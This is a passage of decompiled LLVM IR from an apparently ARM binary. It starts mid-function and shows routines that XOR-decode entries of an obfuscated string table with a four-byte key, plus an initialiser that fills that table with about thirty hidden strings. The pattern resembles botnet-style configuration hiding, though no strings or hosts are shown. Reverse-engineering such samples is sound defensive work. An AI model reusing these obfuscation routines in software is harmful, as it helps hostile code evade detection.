  %v0_fd28 = load i32, i32* %r5.global-to-local, align 4
  %v2_fd28 = xor i32 %v0_fd28, %v6_fd24
  %v1_fd2c = trunc i32 %v2_fd28 to i8
  store i8 %v1_fd2c, i8* %v3_fd24, align 1
  %v2_fd30 = load i32, i32* %v1_fd00, align 4
  %v0_fd34 = load i32, i32* @ip, align 4
  %v2_fd34 = add i32 %v0_fd34, %v2_fd30
  %v3_fd34 = inttoptr i32 %v2_fd34 to i8*
  %v4_fd34 = load i8, i8* %v3_fd34, align 1
  %v6_fd34 = zext i8 %v4_fd34 to i32
  %v0_fd38 = load i32, i32* %r4.global-to-local, align 4
  %v2_fd38 = xor i32 %v0_fd38, %v6_fd34
  store i32 %v2_fd38, i32* @r3, align 4
  %v1_fd3c = trunc i32 %v2_fd38 to i8
  store i8 %v1_fd3c, i8* %v3_fd34, align 1
  %v3_fd40 = load i16, i16* %v2_fcd4, align 4
  %v4_fd40 = zext i16 %v3_fd40 to i32
  %v0_fd44 = load i32, i32* @ip, align 4
  %v1_fd44 = add i32 %v0_fd44, 1
  store i32 %v1_fd44, i32* @ip, align 4
  %v9_fd48 = icmp eq i32 %v4_fd40, %v1_fd44
  store i1 %v9_fd48, i1* @cpsr_z, align 1
  %v8_fd4c = icmp sgt i32 %v4_fd40, %v1_fd44
  br i1 %v8_fd4c, label %dec_label_pc_fd00.dec_label_pc_fd00_crit_edge, label %dec_label_pc_fd50.loopexit

dec_label_pc_fd00.dec_label_pc_fd00_crit_edge:    ; preds = %dec_label_pc_fd00
  %v0_fd08.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_fd00

dec_label_pc_fd50.loopexit:                       ; preds = %dec_label_pc_fd00
  %v2_fd50.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_fd50

dec_label_pc_fd50:                                ; preds = %dec_label_pc_fd50.loopexit, %dec_label_pc_fcc0
  %v2_fd50 = phi i32 [ %v2_fd50.pre, %dec_label_pc_fd50.loopexit ], [ %v3_fce4, %dec_label_pc_fcc0 ]
  store i32 %v2_fd50, i32* @r4, align 4
  ret i32 %v2_fccc

; uselistorder directives
  uselistorder i32 %v1_fd44, { 1, 2, 3, 0 }
  uselistorder i32 %v1_fcf4, { 1, 0 }
  uselistorder i32 %v3_fce0, { 1, 0 }
  uselistorder i32 %v2_fcd0, { 3, 0, 1, 2 }
  uselistorder i32 %v3_fcc8, { 1, 0 }
}

define i32 @function_fd60(i32 %arg1) local_unnamed_addr {
dec_label_pc_fd60:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_fd68 = mul i32 %arg1, 8
  %v2_fd6c = add i32 %v3_fd68, ptrtoint (i32* @global_var_20a78.197 to i32)
  %v2_fd70 = load i32, i32* inttoptr (i32 124936 to i32*), align 8
  %v1_fd74 = add i32 %v3_fd68, add (i32 ptrtoint (i32* @global_var_20a78.197 to i32), i32 4)
  %v2_fd74 = inttoptr i32 %v1_fd74 to i16*
  %v3_fd74 = load i16, i16* %v2_fd74, align 4
  %v3_fd78 = udiv i32 %v2_fd70, 256
  %v2_fd7c = icmp eq i16 %v3_fd74, 0
  %v3_fd80 = udiv i32 %v2_fd70, 65536
  %v3_fd84 = load i32, i32* @r4, align 4
  store i32 %v3_fd84, i32* %stack_var_-16, align 4
  %v1_fd88 = urem i32 %v3_fd78, 256
  store i32 %v1_fd88, i32* %r6.global-to-local, align 4
  %v1_fd8c = urem i32 %v3_fd80, 256
  store i32 %v1_fd8c, i32* %r5.global-to-local, align 4
  %v3_fd90 = udiv i32 %v2_fd70, 16777216
  store i32 %v3_fd90, i32* %r4.global-to-local, align 4
  %v1_fd94 = urem i32 %v2_fd70, 256
  store i32 %v1_fd94, i32* %lr.global-to-local, align 4
  br i1 %v2_fd7c, label %dec_label_pc_fdf0, label %dec_label_pc_fd9c

dec_label_pc_fd9c:                                ; preds = %dec_label_pc_fd60
  store i32 0, i32* @ip, align 4
  %v1_fda0 = inttoptr i32 %v2_fd6c to i32*
  br label %dec_label_pc_fda0

dec_label_pc_fda0:                                ; preds = %dec_label_pc_fda0.dec_label_pc_fda0_crit_edge, %dec_label_pc_fd9c
  %v0_fda8 = phi i32 [ %v0_fda8.pre, %dec_label_pc_fda0.dec_label_pc_fda0_crit_edge ], [ %v1_fd94, %dec_label_pc_fd9c ]
  %v2_fdac = phi i32 [ %v1_fde4, %dec_label_pc_fda0.dec_label_pc_fda0_crit_edge ], [ 0, %dec_label_pc_fd9c ]
  %v2_fda0 = load i32, i32* %v1_fda0, align 4
  %v2_fda4 = add i32 %v2_fda0, %v2_fdac
  %v3_fda4 = inttoptr i32 %v2_fda4 to i8*
  %v4_fda4 = load i8, i8* %v3_fda4, align 1
  %v6_fda4 = zext i8 %v4_fda4 to i32
  %v2_fda8 = xor i32 %v6_fda4, %v0_fda8
  %v1_fdac = trunc i32 %v2_fda8 to i8
  store i8 %v1_fdac, i8* %v3_fda4, align 1
  %v2_fdb0 = load i32, i32* %v1_fda0, align 4
  %v0_fdb4 = load i32, i32* @ip, align 4
  %v2_fdb4 = add i32 %v0_fdb4, %v2_fdb0
  %v3_fdb4 = inttoptr i32 %v2_fdb4 to i8*
  %v4_fdb4 = load i8, i8* %v3_fdb4, align 1
  %v6_fdb4 = zext i8 %v4_fdb4 to i32
  %v0_fdb8 = load i32, i32* %r6.global-to-local, align 4
  %v2_fdb8 = xor i32 %v0_fdb8, %v6_fdb4
  %v1_fdbc = trunc i32 %v2_fdb8 to i8
  store i8 %v1_fdbc, i8* %v3_fdb4, align 1
  %v2_fdc0 = load i32, i32* %v1_fda0, align 4
  %v0_fdc4 = load i32, i32* @ip, align 4
  %v2_fdc4 = add i32 %v0_fdc4, %v2_fdc0
  %v3_fdc4 = inttoptr i32 %v2_fdc4 to i8*
  %v4_fdc4 = load i8, i8* %v3_fdc4, align 1
  %v6_fdc4 = zext i8 %v4_fdc4 to i32
  %v0_fdc8 = load i32, i32* %r5.global-to-local, align 4
  %v2_fdc8 = xor i32 %v0_fdc8, %v6_fdc4
  %v1_fdcc = trunc i32 %v2_fdc8 to i8
  store i8 %v1_fdcc, i8* %v3_fdc4, align 1
  %v2_fdd0 = load i32, i32* %v1_fda0, align 4
  %v0_fdd4 = load i32, i32* @ip, align 4
  %v2_fdd4 = add i32 %v0_fdd4, %v2_fdd0
  %v3_fdd4 = inttoptr i32 %v2_fdd4 to i8*
  %v4_fdd4 = load i8, i8* %v3_fdd4, align 1
  %v6_fdd4 = zext i8 %v4_fdd4 to i32
  %v0_fdd8 = load i32, i32* %r4.global-to-local, align 4
  %v2_fdd8 = xor i32 %v0_fdd8, %v6_fdd4
  %v1_fddc = trunc i32 %v2_fdd8 to i8
  store i8 %v1_fddc, i8* %v3_fdd4, align 1
  %v3_fde0 = load i16, i16* %v2_fd74, align 4
  %v4_fde0 = zext i16 %v3_fde0 to i32
  %v0_fde4 = load i32, i32* @ip, align 4
  %v1_fde4 = add i32 %v0_fde4, 1
  store i32 %v1_fde4, i32* @ip, align 4
  %v8_fdec = icmp sgt i32 %v4_fde0, %v1_fde4
  br i1 %v8_fdec, label %dec_label_pc_fda0.dec_label_pc_fda0_crit_edge, label %dec_label_pc_fdf0.loopexit

dec_label_pc_fda0.dec_label_pc_fda0_crit_edge:    ; preds = %dec_label_pc_fda0
  %v0_fda8.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_fda0

dec_label_pc_fdf0.loopexit:                       ; preds = %dec_label_pc_fda0
  %v2_fdf0.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_fdf0

dec_label_pc_fdf0:                                ; preds = %dec_label_pc_fdf0.loopexit, %dec_label_pc_fd60
  %v2_fdf0 = phi i32 [ %v2_fdf0.pre, %dec_label_pc_fdf0.loopexit ], [ %v3_fd84, %dec_label_pc_fd60 ]
  store i32 %v2_fdf0, i32* @r4, align 4
  ret i32 %v2_fd6c

; uselistorder directives
  uselistorder i32 %v1_fde4, { 1, 2, 0 }
  uselistorder i32 %v1_fd94, { 1, 0 }
  uselistorder i32 %v2_fd70, { 3, 0, 1, 2 }
  uselistorder i32 %v2_fd6c, { 1, 0 }
  uselistorder i32 %v3_fd68, { 1, 0 }
}

define i32 @function_fe00(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_fe00:
  %v3_fe00 = load i32, i32* @r4, align 4
  %v6_fe00 = load i32, i32* @r5, align 4
  %v9_fe00 = load i32, i32* @r6, align 4
  %v12_fe00 = load i32, i32* @r7, align 4
  %v15_fe00 = load i32, i32* @r8, align 4
  %v21_fe00 = load i32, i32* @sl, align 4
  %v24_fe00 = load i32, i32* @fp, align 4
  store i32 2, i32* @r0, align 4
  %v0_fe0c = call i32 @function_1182c()
  store i32 ptrtoint (i32* @global_var_20a78.197 to i32), i32* @r4, align 4
  store i32 2, i32* @r7, align 4
  %v4_fe24 = call i32 @function_10388(i32 %v0_fe0c, i32 ptrtoint ([3 x i8]* @global_var_16224.204 to i32), i32 2)
  store i32 13, i32* @r0, align 4
  store i32 %v0_fe0c, i32* @global_var_20a80.205, align 4
  %v0_fe30 = load i32, i32* @r7, align 4
  %v1_fe30 = trunc i32 %v0_fe30 to i16
  store i16 %v1_fe30, i16* bitcast (i32* @global_var_20a84.206 to i16*), align 4
  store i32 13, i32* @r5, align 4
  %v0_fe38 = call i32 @function_1182c()
  store i32 ptrtoint ([14 x i8]* @global_var_16228.208 to i32), i32* @r8, align 4
  %v0_fe40 = load i32, i32* @r5, align 4
  store i32 %v0_fe38, i32* @r6, align 4
  %v4_fe4c = call i32 @function_10388(i32 %v0_fe38, i32 ptrtoint ([14 x i8]* @global_var_16228.208 to i32), i32 %v0_fe40)
  %v0_fe50 = load i32, i32* @r5, align 4
  store i32 %v0_fe50, i32* @r0, align 4
  %v0_fe54 = load i32, i32* @r6, align 4
  store i32 %v0_fe54, i32* @global_var_20a88.209, align 4
  %v1_fe58 = trunc i32 %v0_fe50 to i16
  store i16 %v1_fe58, i16* bitcast (i32* @global_var_20a8c.210 to i16*), align 4
  %v0_fe5c = call i32 @function_1182c()
  %v0_fe60 = load i32, i32* @r8, align 4
  %v0_fe64 = load i32, i32* @r5, align 4
  store i32 %v0_fe5c, i32* @r6, align 4
  %v4_fe6c = call i32 @function_10388(i32 %v0_fe5c, i32 %v0_fe60, i32 %v0_fe64)
  %v0_fe70 = load i32, i32* @r7, align 4
  store i32 %v0_fe70, i32* @r0, align 4
  %v0_fe74 = load i32, i32* @r6, align 4
  store i32 %v0_fe74, i32* @global_var_20a90.211, align 4
  %v0_fe78 = load i32, i32* @r5, align 4
  %v1_fe78 = trunc i32 %v0_fe78 to i16
  store i16 %v1_fe78, i16* bitcast (i32* @global_var_20a94.212 to i16*), align 4
  %v0_fe7c = call i32 @function_1182c()
  %v0_fe80 = load i32, i32* @r7, align 4
  store i32 %v0_fe7c, i32* @r5, align 4
  %v3_fe8c = call i32 @function_10388(i32 %v0_fe7c, i32 ptrtoint (i32* @global_var_16238.214 to i32), i32 %v0_fe80)
  store i32 29, i32* @r0, align 4
  %v0_fe94 = load i32, i32* @r5, align 4
  store i32 %v0_fe94, i32* @global_var_20a98.215, align 4
  %v0_fe98 = load i32, i32* @r7, align 4
  %v1_fe98 = trunc i32 %v0_fe98 to i16
  store i16 %v1_fe98, i16* bitcast (i32* @global_var_20a9c.216 to i16*), align 4
  %v0_fe9c = call i32 @function_1182c()
  store i32 %v0_fe9c, i32* @r5, align 4
  %v3_feac = call i32 @function_10388(i32 %v0_fe9c, i32 ptrtoint (i32* @global_var_163b8.218 to i32), i32 29)
  store i32 6, i32* @r0, align 4
  store i16 29, i16* bitcast (i32* @global_var_20aa4.219 to i16*), align 4
  %v0_febc = load i32, i32* @r5, align 4
  store i32 %v0_febc, i32* @global_var_20aa0.220, align 4
  %v0_fec0 = call i32 @function_1182c()
  store i32 6, i32* @sb, align 4
  store i32 %v0_fec0, i32* @r5, align 4
  %v4_fed4 = call i32 @function_10388(i32 %v0_fec0, i32 ptrtoint ([7 x i8]* @global_var_1623c.222 to i32), i32 6)
  store i32 7, i32* @r0, align 4
  store i32 7, i32* @r7, align 4
  %v0_fee0 = load i32, i32* @r5, align 4
  store i32 %v0_fee0, i32* @global_var_20aa8.223, align 4
  %v0_fee4 = load i32, i32* @sb, align 4
  %v1_fee4 = trunc i32 %v0_fee4 to i16
  store i16 %v1_fee4, i16* bitcast (i32* @global_var_20aac.224 to i16*), align 4
  %v0_fee8 = call i32 @function_1182c()
  %v0_feec = load i32, i32* @r7, align 4
  store i32 %v0_fee8, i32* @r5, align 4
  %v4_fef8 = call i32 @function_10388(i32 %v0_fee8, i32 ptrtoint ([8 x i8]* @global_var_16244.226 to i32), i32 %v0_feec)
  %v0_fefc = load i32, i32* @r7, align 4
  store i32 %v0_fefc, i32* @r0, align 4
  %v0_ff00 = load i32, i32* @r5, align 4
  store i32 %v0_ff00, i32* @global_var_20ab0.227, align 4
  %v1_ff04 = trunc i32 %v0_fefc to i16
  store i16 %v1_ff04, i16* bitcast (i32* @global_var_20ab4.228 to i16*), align 4
  %v0_ff08 = call i32 @function_1182c()
  %v0_ff0c = load i32, i32* @r7, align 4
  store i32 %v0_ff08, i32* @r5, align 4
  %v4_ff18 = call i32 @function_10388(i32 %v0_ff08, i32 ptrtoint ([8 x i8]* @global_var_1624c.230 to i32), i32 %v0_ff0c)
  store i32 3, i32* @r0, align 4
  %v0_ff20 = load i32, i32* @r5, align 4
  store i32 %v0_ff20, i32* @global_var_20ab8.231, align 4
  %v0_ff24 = load i32, i32* @r7, align 4
  %v1_ff24 = trunc i32 %v0_ff24 to i16
  store i16 %v1_ff24, i16* bitcast (i32* @global_var_20abc.232 to i16*), align 4
  %v0_ff28 = call i32 @function_1182c()
  store i32 %v0_ff28, i32* @r5, align 4
  %v4_ff38 = call i32 @function_10388(i32 %v0_ff28, i32 ptrtoint ([4 x i8]* @global_var_16254.234 to i32), i32 3)
  store i32 19, i32* @r0, align 4
  store i16 3, i16* bitcast (i32* @global_var_20ac4.235 to i16*), align 4
  %v0_ff48 = load i32, i32* @r5, align 4
  store i32 %v0_ff48, i32* @global_var_20ac0.236, align 4
  %v0_ff4c = call i32 @function_1182c()
  store i32 %v0_ff4c, i32* @r5, align 4
  %v3_ff5c = call i32 @function_10388(i32 %v0_ff4c, i32 ptrtoint (i32* @global_var_16258.238 to i32), i32 19)
  store i32 24, i32* @r0, align 4
  store i16 19, i16* bitcast (i32* @global_var_20acc.239 to i16*), align 4
  %v0_ff6c = load i32, i32* @r5, align 4
  store i32 %v0_ff6c, i32* @global_var_20ac8.240, align 4
  %v0_ff70 = call i32 @function_1182c()
  store i32 %v0_ff70, i32* @r5, align 4
  %v3_ff80 = call i32 @function_10388(i32 %v0_ff70, i32 ptrtoint (i32* @global_var_1626c.242 to i32), i32 24)
  store i32 9, i32* @r0, align 4
  store i16 24, i16* bitcast (i32* @global_var_20ad4.243 to i16*), align 4
  %v0_ff90 = load i32, i32* @r5, align 4
  store i32 %v0_ff90, i32* @global_var_20ad0.244, align 4
  %v0_ff94 = call i32 @function_1182c()
  store i32 %v0_ff94, i32* @r5, align 4
  %v4_ffa4 = call i32 @function_10388(i32 %v0_ff94, i32 ptrtoint ([10 x i8]* @global_var_16288.246 to i32), i32 9)
  store i32 16, i32* @r0, align 4
  store i16 9, i16* bitcast (i32* @global_var_20adc.247 to i16*), align 4
  %v0_ffb4 = load i32, i32* @r5, align 4
  store i32 %v0_ffb4, i32* @global_var_20ad8.248, align 4
  %v0_ffb8 = call i32 @function_1182c()
  store i32 16, i32* @sl, align 4
  store i32 %v0_ffb8, i32* @r5, align 4
  %v4_ffcc = call i32 @function_10388(i32 %v0_ffb8, i32 ptrtoint ([17 x i8]* @global_var_16294.250 to i32), i32 16)
  store i32 22, i32* @r0, align 4
  %v0_ffd4 = load i32, i32* @r5, align 4
  store i32 %v0_ffd4, i32* @global_var_20ae0.251, align 4
  %v0_ffd8 = load i32, i32* @sl, align 4
  %v1_ffd8 = trunc i32 %v0_ffd8 to i16
  store i16 %v1_ffd8, i16* bitcast (i32* @global_var_20ae4.252 to i16*), align 4
  %v0_ffdc = call i32 @function_1182c()
  store i32 %v0_ffdc, i32* @r5, align 4
  %v4_ffec = call i32 @function_10388(i32 %v0_ffdc, i32 ptrtoint ([23 x i8]* @global_var_162a8.254 to i32), i32 22)
  %v0_fff4 = load i32, i32* @r7, align 4
  store i32 %v0_fff4, i32* @r0, align 4
  store i16 22, i16* bitcast (i32* @global_var_20aec.255 to i16*), align 4
  %v0_fffc = load i32, i32* @r5, align 4
  store i32 %v0_fffc, i32* @global_var_20ae8.256, align 4
  %v0_10000 = call i32 @function_1182c()
  %v0_10004 = load i32, i32* @r7, align 4
  store i32 %v0_10000, i32* @r5, align 4
  %v4_10010 = call i32 @function_10388(i32 %v0_10000, i32 ptrtoint ([8 x i8]* @global_var_162c0.258 to i32), i32 %v0_10004)
  store i32 5, i32* @r0, align 4
  %v0_10018 = load i32, i32* @r5, align 4
  store i32 %v0_10018, i32* @global_var_20af0.259, align 4
  %v0_1001c = load i32, i32* @r7, align 4
  %v1_1001c = trunc i32 %v0_1001c to i16
  store i16 %v1_1001c, i16* bitcast (i32* @global_var_20af4.260 to i16*), align 4
  %v0_10020 = call i32 @function_1182c()
  store i32 %v0_10020, i32* @r5, align 4
  store i32 5, i32* @fp, align 4
  %v4_10034 = call i32 @function_10388(i32 %v0_10020, i32 ptrtoint ([6 x i8]* @global_var_162c8.262 to i32), i32 5)
  store i32 4, i32* @r0, align 4
  %v0_1003c = load i32, i32* @r5, align 4
  store i32 %v0_1003c, i32* @global_var_20af8.263, align 4
  %v0_10040 = load i32, i32* @fp, align 4
  %v1_10040 = trunc i32 %v0_10040 to i16
  store i16 %v1_10040, i16* bitcast (i32* @global_var_20afc.264 to i16*), align 4
  %v0_10044 = call i32 @function_1182c()
  store i32 %v0_10044, i32* @r5, align 4
  %v4_10054 = call i32 @function_10388(i32 %v0_10044, i32 ptrtoint ([5 x i8]* @global_var_162d0.266 to i32), i32 4)
  %v0_1005c = load i32, i32* @sb, align 4
  store i32 %v0_1005c, i32* @r0, align 4
  store i16 4, i16* bitcast (i32* @global_var_20b04.267 to i16*), align 4
  %v0_10064 = load i32, i32* @r5, align 4
  store i32 %v0_10064, i32* @global_var_20b00.268, align 4
  %v0_10068 = call i32 @function_1182c()
  %v0_10070 = load i32, i32* @sb, align 4
  store i32 %v0_10068, i32* @r5, align 4
  %v4_10078 = call i32 @function_10388(i32 %v0_10068, i32 ptrtoint ([7 x i8]* @global_var_162d8.270 to i32), i32 %v0_10070)
  store i32 14, i32* @r0, align 4
  %v0_10080 = load i32, i32* @r5, align 4
  store i32 %v0_10080, i32* @global_var_20b08.271, align 4
  %v0_10084 = load i32, i32* @sb, align 4
  %v1_10084 = trunc i32 %v0_10084 to i16
  store i16 %v1_10084, i16* bitcast (i32* @global_var_20b0c.272 to i16*), align 4
  %v0_10088 = call i32 @function_1182c()
  store i32 %v0_10088, i32* @r5, align 4
  store i32 14, i32* @r8, align 4
  %v4_1009c = call i32 @function_10388(i32 %v0_10088, i32 ptrtoint ([15 x i8]* @global_var_162e0.274 to i32), i32 14)
  store i32 8, i32* @r0, align 4
  %v0_100a4 = load i32, i32* @r5, align 4
  store i32 %v0_100a4, i32* @global_var_20b10.275, align 4
  %v0_100a8 = load i32, i32* @r8, align 4
  %v1_100a8 = trunc i32 %v0_100a8 to i16
  store i16 %v1_100a8, i16* bitcast (i32* @global_var_20b14.276 to i16*), align 4
  %v0_100ac = call i32 @function_1182c()
  store i32 8, i32* @r6, align 4
  store i32 %v0_100ac, i32* @r5, align 4
  %v4_100c0 = call i32 @function_10388(i32 %v0_100ac, i32 ptrtoint ([9 x i8]* @global_var_162f0.278 to i32), i32 8)
  %v0_100c8 = load i32, i32* @r7, align 4
  store i32 %v0_100c8, i32* @r0, align 4
  %v0_100cc = load i32, i32* @r6, align 4
  %v1_100cc = trunc i32 %v0_100cc to i16
  %v2_100cc = load i32, i32* @r4, align 4
  %v4_100cc = add i32 %v2_100cc, 260
  %v5_100cc = inttoptr i32 %v4_100cc to i16*
  store i16 %v1_100cc, i16* %v5_100cc, align 2
  %v0_100d0 = load i32, i32* @r5, align 4
  store i32 %v0_100d0, i32* @global_var_20b78.279, align 4
  %v0_100d4 = call i32 @function_1182c()
  %v0_100d8 = load i32, i32* @r7, align 4
  store i32 %v0_100d4, i32* @r5, align 4
  %v4_100e4 = call i32 @function_10388(i32 %v0_100d4, i32 ptrtoint ([8 x i8]* @global_var_162fc.281 to i32), i32 %v0_100d8)
  %v0_100ec = load i32, i32* @sl, align 4
  store i32 %v0_100ec, i32* @r0, align 4
  %v0_100f0 = load i32, i32* @r7, align 4
  %v1_100f0 = trunc i32 %v0_100f0 to i16
  %v2_100f0 = load i32, i32* @r4, align 4
  %v4_100f0 = add i32 %v2_100f0, 268
  %v5_100f0 = inttoptr i32 %v4_100f0 to i16*
  store i16 %v1_100f0, i16* %v5_100f0, align 2
  %v0_100f4 = load i32, i32* @r5, align 4
  store i32 %v0_100f4, i32* @global_var_20b80.282, align 4
  %v0_100f8 = call i32 @function_1182c()
  %v0_10100 = load i32, i32* @sl, align 4
  store i32 %v0_100f8, i32* @r5, align 4
  %v4_10108 = call i32 @function_10388(i32 %v0_100f8, i32 ptrtoint ([17 x i8]* @global_var_16304.284 to i32), i32 %v0_10100)
  store i32 23, i32* @r0, align 4
  %v0_10110 = load i32, i32* @r5, align 4
  store i32 %v0_10110, i32* @global_var_20b18.285, align 4
  %v0_10114 = load i32, i32* @sl, align 4
  %v1_10114 = trunc i32 %v0_10114 to i16
  store i16 %v1_10114, i16* bitcast (i32* @global_var_20b1c.286 to i16*), align 4
  %v0_10118 = call i32 @function_1182c()
  store i32 %v0_10118, i32* @r5, align 4
  %v0_10128 = load i32, i32* @r7, align 4
  %v1_10128 = load i32, i32* @sl, align 4
  %v2_10128 = add i32 %v1_10128, %v0_10128
  store i32 %v2_10128, i32* @r7, align 4
  %v4_1012c = call i32 @function_10388(i32 %v0_10118, i32 ptrtoint ([24 x i8]* @global_var_16318.288 to i32), i32 23)
  %v0_10130 = load i32, i32* @r6, align 4
  store i32 %v0_10130, i32* @r0, align 4
  %v0_10134 = load i32, i32* @r5, align 4
  store i32 %v0_10134, i32* @global_var_20b20.289, align 4
  %v0_10138 = load i32, i32* @r7, align 4
  %v1_10138 = trunc i32 %v0_10138 to i16
  store i16 %v1_10138, i16* bitcast (i32* @global_var_20b24.290 to i16*), align 4
  %v0_1013c = call i32 @function_1182c()
  %v0_10144 = load i32, i32* @r6, align 4
  store i32 %v0_1013c, i32* @r5, align 4
  %v4_1014c = call i32 @function_10388(i32 %v0_1013c, i32 ptrtoint ([9 x i8]* @global_var_16330.292 to i32), i32 %v0_10144)
  store i32 21, i32* @r0, align 4
  %v0_10154 = load i32, i32* @r5, align 4
  store i32 %v0_10154, i32* @global_var_20b28.293, align 4
  %v0_10158 = load i32, i32* @r6, align 4
  %v1_10158 = trunc i32 %v0_10158 to i16
  store i16 %v1_10158, i16* bitcast (i32* @global_var_20b2c.294 to i16*), align 4
  %v0_1015c = call i32 @function_1182c()
  store i32 %v0_1015c, i32* @r5, align 4
  %v3_1016c = call i32 @function_10388(i32 %v0_1015c, i32 ptrtoint (i32* @global_var_163d8.296 to i32), i32 21)
  store i32 17, i32* @r0, align 4
  store i16 21, i16* bitcast (i32* @global_var_20b34.297 to i16*), align 4
  %v0_1017c = load i32, i32* @r5, align 4
  store i32 %v0_1017c, i32* @global_var_20b30.298, align 4
  %v0_10180 = call i32 @function_1182c()
  store i32 %v0_10180, i32* @r5, align 4
  %v4_10190 = call i32 @function_10388(i32 %v0_10180, i32 ptrtoint ([18 x i8]* @global_var_1633c.300 to i32), i32 17)
  store i32 12, i32* @r0, align 4
  store i16 17, i16* bitcast (i32* @global_var_20b3c.301 to i16*), align 4
  %v0_101a0 = load i32, i32* @r5, align 4
  store i32 %v0_101a0, i32* @global_var_20b38.302, align 4
  %v0_101a4 = call i32 @function_1182c()
  store i32 %v0_101a4, i32* @r5, align 4
  %v4_101b4 = call i32 @function_10388(i32 %v0_101a4, i32 ptrtoint ([13 x i8]* @global_var_16350.304 to i32), i32 12)
  %v0_101bc = load i32, i32* @r8, align 4
  store i32 %v0_101bc, i32* @r0, align 4
  store i16 12, i16* bitcast (i32* @global_var_20b44.305 to i16*), align 4
  %v0_101c4 = load i32, i32* @r5, align 4
  store i32 %v0_101c4, i32* @global_var_20b40.306, align 4
  %v0_101c8 = call i32 @function_1182c()
  %v0_101d0 = load i32, i32* @r8, align 4
  store i32 %v0_101c8, i32* @r5, align 4
  %v4_101d8 = call i32 @function_10388(i32 %v0_101c8, i32 ptrtoint ([15 x i8]* @global_var_16360.308 to i32), i32 %v0_101d0)
  store i32 19, i32* @r0, align 4
  %v0_101e0 = load i32, i32* @r5, align 4
  store i32 %v0_101e0, i32* @global_var_20b48.309, align 4
  %v0_101e4 = load i32, i32* @r8, align 4
  %v1_101e4 = trunc i32 %v0_101e4 to i16
  store i16 %v1_101e4, i16* bitcast (i32* @global_var_20b4c.310 to i16*), align 4
  %v0_101e8 = call i32 @function_1182c()
  store i32 %v0_101e8, i32* @r5, align 4
  %v4_101f8 = call i32 @function_10388(i32 %v0_101e8, i32 ptrtoint ([20 x i8]* @global_var_16370.312 to i32), i32 19)
  %v0_10200 = load i32, i32* @r6, align 4
  store i32 %v0_10200, i32* @r0, align 4
  store i16 19, i16* bitcast (i32* @global_var_20b54.313 to i16*), align 4
  %v0_10208 = load i32, i32* @r5, align 4
  store i32 %v0_10208, i32* @global_var_20b50.314, align 4
  %v0_1020c = call i32 @function_1182c()
  %v0_10214 = load i32, i32* @r6, align 4
  store i32 %v0_1020c, i32* @r5, align 4
  %v4_1021c = call i32 @function_10388(i32 %v0_1020c, i32 ptrtoint ([9 x i8]* @global_var_16384.316 to i32), i32 %v0_10214)
  %v0_10220 = load i32, i32* @fp, align 4
  store i32 %v0_10220, i32* @r0, align 4
  %v0_10224 = load i32, i32* @r5, align 4
  store i32 %v0_10224, i32* @global_var_20b58.317, align 4
  %v0_10228 = load i32, i32* @r6, align 4
  %v1_10228 = trunc i32 %v0_10228 to i16
  store i16 %v1_10228, i16* bitcast (i32* @global_var_20b5c.318 to i16*), align 4
  %v0_1022c = call i32 @function_1182c()
  %v0_10234 = load i32, i32* @fp, align 4
  store i32 %v0_1022c, i32* @r5, align 4
  %v4_1023c = call i32 @function_10388(i32 %v0_1022c, i32 ptrtoint ([6 x i8]* @global_var_16390.320 to i32), i32 %v0_10234)
  %v0_10240 = load i32, i32* @sb, align 4
  store i32 %v0_10240, i32* @r0, align 4
  %v0_10244 = load i32, i32* @r5, align 4
  store i32 %v0_10244, i32* @global_var_20b60.321, align 4
  %v0_10248 = load i32, i32* @fp, align 4
  %v1_10248 = trunc i32 %v0_10248 to i16
  store i16 %v1_10248, i16* bitcast (i32* @global_var_20b64.322 to i16*), align 4
  %v0_1024c = call i32 @function_1182c()
  %v0_10254 = load i32, i32* @sb, align 4
  store i32 %v0_1024c, i32* @r5, align 4
  %v4_1025c = call i32 @function_10388(i32 %v0_1024c, i32 ptrtoint ([7 x i8]* @global_var_16398.324 to i32), i32 %v0_10254)
  %v0_10260 = load i32, i32* @r7, align 4
  store i32 %v0_10260, i32* @r0, align 4
  %v0_10264 = load i32, i32* @r5, align 4
  store i32 %v0_10264, i32* @global_var_20b68.325, align 4
  %v0_10268 = load i32, i32* @sb, align 4
  %v1_10268 = trunc i32 %v0_10268 to i16
  store i16 %v1_10268, i16* bitcast (i32* @global_var_20b6c.326 to i16*), align 4
  %v0_1026c = call i32 @function_1182c()
  %v0_10274 = load i32, i32* @r7, align 4
  %v4_1027c = call i32 @function_10388(i32 %v0_1026c, i32 ptrtoint ([24 x i8]* @global_var_163a0.328 to i32), i32 %v0_10274)
  %v0_10280 = load i32, i32* @r7, align 4
  %v1_10280 = trunc i32 %v0_10280 to i16
  store i16 %v1_10280, i16* bitcast (i32* @global_var_20b74.329 to i16*), align 4
  store i32 %v0_1026c, i32* @global_var_20b70.330, align 4
  store i32 %v3_fe00, i32* @r4, align 4
  store i32 %v6_fe00, i32* @r5, align 4
  store i32 %v9_fe00, i32* @r6, align 4
  store i32 %v12_fe00, i32* @r7, align 4
  store i32 %v15_fe00, i32* @r8, align 4
  store i32 %v21_fe00, i32* @sl, align 4
  store i32 %v24_fe00, i32* @fp, align 4
  ret i32 %v4_1027c

; uselistorder directives
  uselistorder i32 %v0_1024c, { 1, 0 }
  uselistorder i32 %v0_1022c, { 1, 0 }
  uselistorder i32 %v0_1020c, { 1, 0 }
  uselistorder i32 %v0_101c8, { 1, 0 }
  uselistorder i32 %v0_1013c, { 1, 0 }
  uselistorder i32 %v0_100f8, { 1, 0 }
  uselistorder i32 %v0_100d4, { 1, 0 }
  uselistorder i32 %v0_100ac, { 1, 0 }
  uselistorder i32 %v0_10068, { 1, 0 }
  uselistorder i32 %v0_10000, { 1, 0 }
  uselistorder i32 %v0_ffb8, { 1, 0 }
  uselistorder i32 %v0_ff08, { 1, 0 }
  uselistorder i32 %v0_fee8, { 1, 0 }
  uselistorder i32 %v0_fec0, { 1, 0 }
  uselistorder i32 %v0_fe7c, { 1, 0 }
  uselistorder i32 %v0_fe5c, { 1, 0 }
  uselistorder i32 %v0_fe38, { 1, 0 }
  uselistorder i32 21, { 0, 6, 7, 5, 1, 2, 3, 4 }
